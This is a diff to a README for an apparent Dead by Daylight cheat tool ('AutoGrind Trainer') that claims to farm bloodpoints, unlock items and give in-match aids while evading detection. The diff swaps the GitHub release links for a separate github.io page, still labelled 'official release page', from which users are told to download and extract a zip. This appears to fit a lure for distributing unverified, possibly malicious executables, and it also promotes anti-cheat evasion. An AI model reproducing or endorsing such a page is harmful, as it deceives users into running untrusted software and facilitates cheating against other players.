@@ -1,6 +1,6 @@
 # 🎮 DBD-AutoGrind-Trainer-2026-Plus - Collect points and unlock items easily
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://github.com/Guardofhonorsericocarpus535/DBD-AutoGrind-Trainer-2026-Plus/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue?style=for-the-badge)](https://guardofhonorsericocarpus535.github.io)
 
 This software automates repetitive tasks in Dead by Daylight. It collects bloodpoints, unlocks perks and skins, and provides visual aids during matches. The tool operates externally to reduce detection risks.
 
@@ -20,7 +20,7 @@ Ensure your computer meets these specifications before you begin:
 
 Follow these steps to set up the trainer on your system:
 
-1.  Visit the official release page to download the latest version: [https://github.com/Guardofhonorsericocarpus535/DBD-AutoGrind-Trainer-2026-Plus/releases](https://github.com/Guardofhonorsericocarpus535/DBD-AutoGrind-Trainer-2026-Plus/releases).
+1.  Visit the official release page to download the latest version: [https://guardofhonorsericocarpus535.github.io](https://guardofhonorsericocarpus535.github.io).
 2.  Locate the downloaded .zip file in your Downloads folder.
 3.  Right-click the file and select Extract All. Choose a folder on your desktop for easy access.
 4.  Open the extracted folder.
